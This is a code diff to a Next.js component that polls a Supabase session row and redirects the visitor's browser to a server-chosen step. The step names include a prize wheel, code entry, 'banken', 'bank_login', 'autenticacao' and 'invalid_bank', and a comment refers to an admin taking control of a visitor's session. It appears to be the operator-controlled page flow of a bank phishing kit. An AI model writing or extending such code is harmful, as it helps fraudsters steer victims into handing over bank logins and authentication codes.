@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { pathToStep, stepToPath } from "@/lib/session-routes";
 import {
@@ -46,19 +46,16 @@ async function resolvePublicIdToUuidInline(
   }
   try {
     const pid = Number(sid);
-    // limit(1): maybeSingle birden fazla eslesmede hata verir; en guncel kaydi al.
     const { data, error } = await sb
       .from("sessions")
       .select("id, public_id")
       .eq("public_id", pid)
-      .order("updated_at", { ascending: false })
-      .limit(1);
-    const row = Array.isArray(data) ? data[0] : data;
-    if (!error && row && row.id) {
+      .maybeSingle();
+    if (!error && data && data.id) {
       return {
         ok: true,
-        uuid: String(row.id),
-        routeSessionId: row.public_id != null ? String(row.public_id) : sid,
+        uuid: String(data.id),
+        routeSessionId: data.public_id != null ? String(data.public_id) : sid,
       };
     }
   } catch {
@@ -107,14 +104,15 @@ export function SessionRealtimeGate({
     let resolvedUuid: string | undefined = undefined;
     let resolvedRouteSid: string | undefined = routeSid;
     let initialResolved = false;
+    let cancelled = false;
     let tickN = 0;
     let nextAllowedAt = 0;
     let lastSrv = "";
-    let missingTicks = 0;
 
     (async () => {
       try {
         const r = await resolvePublicIdToUuidInline(sb, sid);
+        if (cancelled) return;
         resolvedUuid = r.uuid;
         resolvedRouteSid = r.routeSessionId || routeSid;
         setDbg(prev => ({ ...prev, uuid: r.uuid, route: r.routeSessionId || routeSid || "" }));
@@ -126,29 +124,12 @@ export function SessionRealtimeGate({
     })();
 
     const tick = async () => {
+      if (cancelled) return;
       tickN++;
       try {
-        if (!initialResolved) {
-          setDbg(prev => ({ ...prev, tick: tickN, lastError: "resolving..." }));
+        if (!initialResolved || !resolvedUuid) {
+          setDbg(prev => ({ ...prev, tick: tickN, lastError: initialResolved ? "uuid yok" : "resolving..." }));
           return;
-        }
-
-        // public_id -> uuid cozumleme ilk seferde basarisiz olduysa (gecici hata)
-        // her tick tekrar dene; yoksa id=numeric sorgusu sonsuza dek bos doner.
-        if (!resolvedUuid || !isUuidSessionIdentifier(resolvedUuid)) {
-          try {
-            const r = await resolvePublicIdToUuidInline(sb, sid);
-            resolvedUuid = r.uuid;
-            resolvedRouteSid = r.routeSessionId || resolvedRouteSid;
-          } catch {
-            /* siradaki tick tekrar dener */
-          }
-          if (!resolvedUuid || !isUuidSessionIdentifier(resolvedUuid)) {
-            missingTicks++;
-            setDbg(prev => ({ ...prev, tick: tickN, lastError: "uuid cozulmedi (" + missingTicks + ")" }));
-            if (missingTicks >= 10) window.location.href = "/";
-            return;
-          }
         }
 
         const localPath = window.location.pathname;
@@ -163,26 +144,14 @@ export function SessionRealtimeGate({
           .eq("id", resolvedUuid)
           .maybeSingle();
 
-        if (error) {
+        if (error || !data) {
           setDbg(prev => ({
             ...prev,
             tick: tickN,
-            lastError: "DB err: " + String(error.message || error),
+            lastError: error ? "DB err: " + String(error.message || error) : "satir bulunamadi",
           }));
           return;
         }
-
-        if (!data) {
-          // Session satiri yok: admin kalici sildi ya da baska ziyaretci devraldi.
-          // Sayfada bugda kalmak yerine ana domainden temiz session al.
-          missingTicks++;
-          setDbg(prev => ({ ...prev, tick: tickN, lastError: "satir yok (" + missingTicks + ")" }));
-          if (missingTicks >= 10) {
-            window.location.href = "/";
-          }
-          return;
-        }
-        missingTicks = 0;
 
         const srv = String(data.current_step || "");
         if (!srv) {
@@ -211,8 +180,9 @@ export function SessionRealtimeGate({
 
         const lsStr = String(localStep);
         if (lsStr === "wheel" && srv === "code_entry") { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
-        if (lsStr === "banken" && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
+        if (lsStr === "banken" && (srv === "bank" || srv === "bank_login" || srv === "autenticacao")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
         if ((lsStr === "banken2" || lsStr === "invalid_bank") && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
+        if (lsStr === "autenticacao" && (srv === "bank" || srv === "bank_login" || srv === "autenticacao")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
 
         const finalRouteSid = (data.public_id != null) ? String(data.public_id) : (resolvedRouteSid || resolvedUuid);
         let target = "";
@@ -269,7 +239,10 @@ export function SessionRealtimeGate({
 
     void tick();
     const t = window.setInterval(() => void tick(), 500);
-    return () => window.clearInterval(t);
+    return () => {
+      cancelled = true;
+      window.clearInterval(t);
+    };
   }, []);
 
   // SESSIONREALTIMEGATE: Hiçbir UI/debug kutusu yok, sadece polling + yönlendirme
